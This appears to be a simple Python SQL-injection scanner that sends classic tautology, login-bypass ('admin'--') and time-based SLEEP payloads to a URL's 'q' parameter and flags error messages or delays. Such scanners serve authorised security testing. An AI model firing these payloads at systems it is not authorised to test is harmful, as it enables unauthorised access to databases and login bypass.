import requests
import time

# List of common SQL payloads to test against the target URL
COMMON_SQL_PAYLOADS = [
    "' OR '1'='1",  # Simple SQL injection that tries to return true for all queries
    "' OR 1=1 --",  # Attempts to unconditionally return all data, with comment to block remaining SQL
    "' OR 'a'='a",  # Tautology based injection, always true
    "admin'--"      # Payload that aims to bypass login by commenting out the password check
]

# Time-based SQL payload to identify blind SQL injection vulnerabilities
TIME_BASED_SQL_PAYLOAD = "' OR IF(1=1, SLEEP(3), 0) --"

def check_sql_injection(url):
    """
    Performs a security test on the provided URL to check for SQL injection vulnerabilities.
    - Injects various SQL payloads to check for typical SQL injection vulnerabilities.
    - Additionally checks for time-based blind SQL injection by inducing a delay in the response.

    Args:
        url (str): The URL of the web application to test for SQL injection vulnerabilities.

    Returns:
        list: A list of dictionaries, each containing the payload used and the test results.
    """

    results = []  # Stores results of the injection tests

    # Test each payload in the common list
    for payload in COMMON_SQL_PAYLOADS:
        test_url = f"{url}?q={payload}"  # Append payload to URL query parameter 'q'
        try:
            response = requests.get(test_url, timeout=5)  # Making an HTTP GET request
            # Check for SQL error messages in the response
            if any(err in response.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "evidence": "SQL error found in response"
                })
            else:
                results.append({
                    "payload": payload,
                    "vulnerable": False
                })
        except requests.RequestException:
            # Handle exceptions such as timeout, connection error
            pass

    # Additional check for time-based blind SQL injection
    try:
        start_time = time.time()
        requests.get(f"{url}?q={TIME_BASED_SQL_PAYLOAD}", timeout=10)
        end_time = time.time()
        # Check if response time was significantly longer than the timeout threshold
        if end_time - start_time > 2:
            results.append({
                "payload": TIME_BASED_SQL_PAYLOAD,
                "vulnerable": True,
                "evidence": "Response time delay detected (possible blind SQL injection)"
            })
    except requests.RequestException:
        # Handle exceptions for the time-based payload
        pass

    return results  # Return all results from the tests
